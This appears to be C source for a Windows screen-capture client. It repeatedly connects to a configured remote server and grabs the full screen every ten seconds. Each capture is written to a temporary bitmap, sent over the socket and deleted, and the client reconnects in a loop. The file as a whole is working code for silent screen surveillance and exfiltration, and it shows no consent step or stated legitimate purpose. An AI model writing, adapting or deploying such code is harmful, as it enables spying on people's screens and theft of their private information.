#include "utils.h"
#include <stdlib.h>
#include <stdint.h>
#include <ws2tcpip.h>


int keep_alive_loop(SOCKET sock)
{

	char response[10];
	long long counter = 0;

	char temp_path[MAX_PATH];
	char temp_filename[MAX_PATH];
	int result = -1;

	if ((result = GetTempPathA(MAX_PATH, temp_path)) == 0)
	{
		result = -1;
		goto __exit_0;
	}

	while (true)
	{
		counter++;

		snprintf(temp_filename, MAX_PATH, "%sscreenshot_%lld_%lld.bmp",
			temp_path, (long long)time(NULL), counter);

		// capture screenshot
		if (capture_screenshot(temp_filename) != 0)
		{
			cleanup_temp_file(temp_filename);

			// if capture screenshot failed, we sleep 3s, then re-capture.
			Sleep(3000);
			continue;
		}

		result = send_file(temp_filename, sock);
		cleanup_temp_file(temp_filename);

		if (result == 0)
		{
			int bytes_received = recv(sock, response, sizeof(response) - 1, 0);
			if (bytes_received > 0)
			{
				response[bytes_received] = '\0';
			}
			else if (bytes_received == 0)
			{
				return -1;
			}
			else
			{
				int error = WSAGetLastError();
				if (error == WSAETIMEDOUT)
				{
					// receive timeout
				}
				else
				{
					// receive timeout
					return -1;
				}
			}
		}
		else
		{
			// send failed.
			return -1;
		}

		Sleep(10000);
	}


__exit_0:
	return result;
}


int init_connection()
{
	WSADATA wsa_data;
	SOCKET client_socket;
	struct sockaddr_in server_addr;

	int result = 1;

	if ((result = WSAStartup(MAKEWORD(2, 2), &wsa_data)) != 0)
	{
		goto __exit_0;
	}


	while (1)
	{
		client_socket = socket(AF_INET, SOCK_STREAM, 0);

		if (client_socket == INVALID_SOCKET)
		{
			result = -1;
			goto __exit_1;
		}

		server_addr.sin_family = AF_INET;
		server_addr.sin_port = htons(SERVER_PORT);
		if (inet_pton(AF_INET, SERVER_HOSTNAME, &server_addr.sin_addr) <= 0)
		{
			goto __exit_1;
		}

		result = connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));

		if (result == SOCKET_ERROR)
		{
			closesocket(client_socket);
			Sleep(5000);
			continue;
		}

		result = keep_alive_loop(client_socket);

		if (result != 0)
		{
			Sleep(5000);
		}

	}


__exit_1:
	WSACleanup();

__exit_0:
	return result;
}

int capture_screenshot(const char* filename)
{
	HDC hdcScreen = NULL;
	HDC hdcMemDC = NULL;
	HBITMAP hBitmap = NULL;
	HBITMAP hOldBitmap = NULL;
	BITMAPINFOHEADER bi;
	FILE* fp = NULL;
	int success = 0;


	DWORD dwBmpSize = 0;
	DWORD dwSizeOfDIB = 0;
	BYTE* lpbitmap = NULL;

	// 获取屏幕DC
	hdcScreen = GetDC(NULL);
	if (!hdcScreen) {
		printf("获取屏幕DC失败\n");
		return -1;
	}

	// 创建兼容DC
	hdcMemDC = CreateCompatibleDC(hdcScreen);
	if (!hdcMemDC) {
		printf("创建内存DC失败\n");
		ReleaseDC(NULL, hdcScreen);
		return -1;
	}

	// 获取屏幕分辨率
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	// 创建兼容位图
	hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
	if (!hBitmap) {
		printf("创建位图失败\n");
		DeleteDC(hdcMemDC);
		ReleaseDC(NULL, hdcScreen);
		return -1;
	}

	// 选择位图到内存DC
	hOldBitmap = (HBITMAP)SelectObject(hdcMemDC, hBitmap);

	// 复制屏幕到内存DC
	if (!BitBlt(hdcMemDC, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY)) {
		printf("复制屏幕失败\n");
		goto cleanup_0;
	}

	// 准备BITMAPINFOHEADER
	ZeroMemory(&bi, sizeof(BITMAPINFOHEADER));
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = screenWidth;
	bi.biHeight = -screenHeight;  // 负值表示从上到下的DIB
	bi.biPlanes = 1;
	bi.biBitCount = 24;  // 24位色
	bi.biCompression = BI_RGB;

	// 计算图像数据大小
	dwBmpSize = ((screenWidth * 24 + 31) / 32) * 4 * screenHeight;

	// 写入BMP文件
	fopen_s(&fp, filename, "wb");
	if (!fp) {
		printf("创建文件失败: %s\n", filename);
		goto cleanup_0;
	}

	// BMP文件头
	BITMAPFILEHEADER bmfHeader;
	dwSizeOfDIB = dwBmpSize + sizeof(BITMAPINFOHEADER);

	bmfHeader.bfType = 0x4D42;  // "BM"
	bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
	bmfHeader.bfReserved1 = 0;
	bmfHeader.bfReserved2 = 0;
	bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	// 写入文件头
	fwrite(&bmfHeader, sizeof(BITMAPFILEHEADER), 1, fp);
	fwrite(&bi, sizeof(BITMAPINFOHEADER), 1, fp);

	// 分配内存并获取位图数据
	lpbitmap = (BYTE*)malloc(dwBmpSize);
	if (!lpbitmap) {
		printf("内存分配失败\n");
		goto cleanup;
	}

	// 获取位图数据
	GetDIBits(hdcScreen, hBitmap, 0, (UINT)screenHeight, lpbitmap,
		(BITMAPINFO*)&bi, DIB_RGB_COLORS);

	// 写入像素数据
	fwrite(lpbitmap, dwBmpSize, 1, fp);

	success = 1;

cleanup:
	// 清理资源
	if (lpbitmap) free(lpbitmap);
	if (fp) {
		long file_size = ftell(fp);
		fclose(fp);
		if (success) {
			printf("截图保存到: %s (%ld 字节)\n", filename, file_size);
		}
	}
cleanup_0:
	if (hOldBitmap) SelectObject(hdcMemDC, hOldBitmap);
	if (hBitmap) DeleteObject(hBitmap);
	if (hdcMemDC) DeleteDC(hdcMemDC);
	if (hdcScreen) ReleaseDC(NULL, hdcScreen);

	return success ? 0 : -1;
}

int send_file(const char* filename, SOCKET sock)
{
	FILE* fp = NULL;
	long file_size;
	char* buffer = NULL;
	size_t bytes_read;
	long total_sent = 0;
	int result;

	// 打开文件
	fopen_s(&fp, filename, "rb");
	if (!fp) {
		printf("无法打开文件: %s\n", filename);
		return -1;
	}

	// 获取文件大小
	fseek(fp, 0, SEEK_END);
	file_size = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	if (file_size <= 0) {
		printf("文件为空或无效\n");
		fclose(fp);
		return -1;
	}

	// 分配缓冲区
	buffer = (char*)malloc(file_size);
	if (!buffer) {
		printf("内存分配失败\n");
		fclose(fp);
		return -1;
	}

	// 读取文件
	bytes_read = fread(buffer, 1, file_size, fp);
	if (bytes_read != file_size) {
		printf("读取文件不完全\n");
		free(buffer);
		fclose(fp);
		return -1;
	}

	fclose(fp);

	// 发送文件大小（8字节，大端序）
	uint64_t size_be = _byteswap_uint64((uint64_t)file_size);
	result = send(sock, (char*)&size_be, sizeof(size_be), 0);
	if (result == SOCKET_ERROR) {
		int error = WSAGetLastError();
		printf("发送文件大小失败: %d\n", error);
		free(buffer);
		return -1;
	}

	// 发送文件数据
	while (total_sent < file_size) {
		long remaining = file_size - total_sent;
		int to_send = remaining > 4096 ? 4096 : remaining;

		result = send(sock, buffer + total_sent, to_send, 0);
		if (result == SOCKET_ERROR) {
			int error = WSAGetLastError();
			printf("发送数据失败: %d\n", error);
			free(buffer);
			return -1;
		}

		total_sent += result;
	}

	printf("文件发送完成: %d 字节\n", total_sent);
	free(buffer);
	return 0;
}

int cleanup_temp_file(const char* filename)
{
	if (DeleteFileA(filename)) {
		printf("临时文件已删除\n");
		return 0;
	}
	else {
		DWORD error = GetLastError();
		if (error != ERROR_FILE_NOT_FOUND) {
			printf("删除临时文件失败: %s (错误代码: %lu)\n", filename, error);
		}
		return -1;
	}
}
